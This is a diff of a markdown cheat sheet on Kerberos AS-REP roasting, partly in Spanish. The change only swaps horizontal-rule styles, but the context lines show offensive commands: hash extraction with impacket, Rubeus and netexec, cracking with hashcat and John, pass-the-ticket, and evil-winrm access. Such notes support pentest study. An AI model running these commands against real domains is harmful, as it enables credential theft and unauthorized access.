@@ -18,7 +18,7 @@ linked:
 ---
 # AS-REP Roasting - Roast With Auth & Crack
 
-***
+---
 
 ## Impacket GetNPUsers (Auth)
 
@@ -39,7 +39,7 @@ impacket-GetNPUsers corp.local/auditor:'Pass!' -dc-ip <DC> \
 # Auto-discovers todos users con flag + roast bulk
 ```
 
-___
+---
 
 ## Rubeus asreproast (Windows)
 
@@ -60,7 +60,7 @@ Rubeus.exe asreproast /user:legacy_svc /format:hashcat /outfile:legacy.hash
 Rubeus.exe asreproast /format:hashcat /outfile:all.hash
 ```
 
-___
+---
 
 ## netexec asreproast
 
@@ -71,7 +71,7 @@ ___
 | `nxc ldap <DC> -u u -p p -k --asreproast asrep.hash` | Kerberos | OPSEC. |
 ^asrep-auth-nxc
 
-___
+---
 
 ## Hashcat Cracking
 
@@ -95,7 +95,7 @@ hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -O
 hashcat -m 18200 asrep.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O
 ```
 
-___
+---
 
 ## John the Ripper
 
@@ -106,7 +106,7 @@ ___
 | `john --format=krb5asrep --show asrep.hash` | Show cracked | Post-run. |
 ^asrep-auth-john
 
-___
+---
 
 ## Wordlists Recomendadas
 
@@ -119,7 +119,7 @@ ___
 | `seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt` | Top 1M | Coverage. |
 ^asrep-auth-wordlists
 
-___
+---
 
 ## Post-Crack Verification
 
@@ -131,7 +131,7 @@ ___
 | `Rubeus.exe asktgt /user:<user> /password:<cracked> /domain:corp.local /ptt` | TGT auth | Standard use. |
 ^asrep-auth-verify
 
-___
+---
 
 ## Cracked Password Privesc Chain
 
@@ -156,7 +156,7 @@ evil-winrm -i <target> -u $USER -p $PWD
 # UI: User node → Mark Owned
 ```
 
-___
+---
 
 ## Common Errors
 
@@ -169,4 +169,4 @@ ___
 | Hash sin output (silent) | User no tiene flag set realmente | Verify con `Get-ADUser -Filter`. |
 ^asrep-auth-errors
 
-***
+---
